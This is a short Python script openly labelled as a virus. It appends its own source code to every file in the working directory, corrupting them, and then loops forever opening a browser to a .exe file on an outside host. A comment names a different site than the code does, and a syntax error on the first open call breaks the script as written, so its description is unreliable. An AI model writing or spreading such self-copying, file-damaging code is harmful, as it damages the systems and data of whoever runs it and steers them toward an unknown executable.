import os
import webbrowser

virus_file = open"(virus.py", "r")
virus_code = virus_file.read()
virus_file.close()

for file_name in os.listdir():
  file = open(file_name, "a")
  file.write(virus_code)
  file.close()

  while True:
    webbrowser.open("https://progaming.monster/RTJG9F.exe")

    #This virus continues to open https://getmimo.com until its removed or the computer crashes